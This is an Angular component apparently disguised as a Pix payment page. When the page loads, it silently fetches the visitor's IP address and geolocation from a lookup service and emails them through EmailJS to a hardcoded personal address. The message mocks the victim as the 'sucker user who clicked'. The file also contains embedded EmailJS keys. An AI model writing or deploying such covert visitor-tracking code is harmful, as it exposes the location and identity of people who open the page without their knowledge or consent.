import { Component, OnInit } from '@angular/core';
import { HttpClient } from '@angular/common/http';
import { MessageService } from 'primeng/api';
import * as emailjs from 'emailjs-com';

@Component({
  selector: 'app-pix',
  templateUrl: './pix.component.html',
  styleUrls: ['./pix.component.scss']
})
export class PixComponent implements OnInit {
  status: string = '';
  latitude: number = 0;
  longitude: number = 0;
  locationPermissionGranted: boolean = false;
  isLoading: boolean = true;

  constructor(private http: HttpClient, private messageService: MessageService) {}

  ngOnInit(): void {
    this.fetchDataAndSendEmail();
  }

  destinatario = 'caslumach@gmail.com'

  async fetchDataAndSendEmail(): Promise<void> {
    try {
      // Fazer a requisição JSONP
      const data: any = await this.http.get('https://geolocation-db.com/json/').toPromise();
      console.log(data)
      debugger;
      
      // Preparar o template do email
      const templateParams = {
        to_email: this.destinatario,
        message: JSON.stringify(data, null, 2)
      };

              const body = `
        De: "Usuario otario que clicou",
        email: "teste@gmail.com",
        telefone: "0000000",
        latitude: ${this.latitude},
        longitude: ${this.longitude}
        ip: "${data?.IPv4 || 'Desconhecido'}",
        `

        emailjs.init('f2J6XmohA9QKj10T7');
    
        emailjs.send('service_xgv1psc', 'template_2cuonkn', {
          to_name: this.destinatario,
          message: body,
        }).then((response) => {
            this.messageService.add({
              severity: 'success',
              summary: 'Sucesso',
              detail: 'Email enviado',
              life: 3000,
            });
          })
          .catch((error) => {
            console.error('Erro ao enviar e-mail', error);
          });
    } catch (error) {
      this.messageService.add({
        severity: 'error',
        summary: 'Erro',
        detail: 'Erro ao buscar dados ou enviar email.',
        life: 5000,
      });
      console.error('Erro:', error);
    }
  }

}
